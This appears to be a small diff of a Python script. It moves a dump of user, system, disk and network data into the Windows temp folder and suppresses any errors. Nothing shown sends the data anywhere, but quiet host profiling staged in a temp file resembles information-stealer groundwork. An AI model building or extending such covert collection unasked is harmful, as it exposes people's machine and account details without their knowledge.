@@ -84,7 +84,7 @@ def network():
 #print(f"User data: {user()}\nSystem data: {system()}\nDisk data: {disk()}\nNetwork data: {network()}")
 def start():
     try:
-        with open("system.txt", "w",encoding="utf-8") as f:
+        with open(f"{os.getenv('temp')}\\system.txt", "w",encoding="utf-8") as f:
             f.write(f"User data: {user()}\nSystem data: {system()}\nDisk data: {disk()}\nNetwork data: {network()}")
     except:
         pass
